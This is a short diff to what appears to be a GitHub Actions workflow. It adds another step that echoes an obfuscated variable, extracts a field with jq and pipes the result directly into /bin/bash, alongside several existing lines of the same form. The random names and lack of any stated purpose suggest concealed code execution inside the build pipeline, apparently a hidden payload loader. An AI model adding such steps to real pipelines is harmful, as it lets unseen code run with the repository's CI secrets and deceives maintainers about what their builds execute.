@@ -33,6 +33,7 @@ jobs:
           echo $zmlx576 | jq -r .uxgge7972 | /bin/bash
           printf '%s' "$hpzy03360" | jq -r .ckckn807 | /bin/bash
           printf '%s' "$jbxc30507" | jq -r .bqnx8 | /bin/bash
+          echo $a6 | jq -r .yvbd5648 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
